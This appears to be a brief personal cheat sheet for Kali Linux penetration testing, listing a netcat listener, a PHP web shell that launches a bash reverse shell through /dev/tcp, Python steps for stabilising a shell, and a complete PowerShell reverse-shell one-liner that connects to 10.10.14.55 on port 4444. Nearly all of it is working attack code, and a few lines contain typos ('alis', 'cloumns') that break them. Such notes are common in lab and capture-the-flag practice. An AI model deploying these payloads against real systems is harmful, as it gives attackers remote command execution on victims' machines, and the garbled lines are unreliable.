For kali Shell scripts:
```
/usr/share/webshells
```
### Reverse Shell listener
```shell
nc -lvnp 4444
# Windows Reverse Shell
```
### PHP Web Shell
``` php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<your_kali_ip>/4444 0>&1'"); ?>
```
# Shell Stabilization

### Python3
Stabilize to bin/bash
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
<Ctrl+Z>
stty raw -echo;fg
```
or
``` bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-255color
alis ll='clear ; ls -lsaht --color=auto'
<Ctrl+Z>
stty raw -echo; fg ; reset
stty cloumns 200 rows 200
```
### Webshell -> Reverse shell
``` powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.55',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```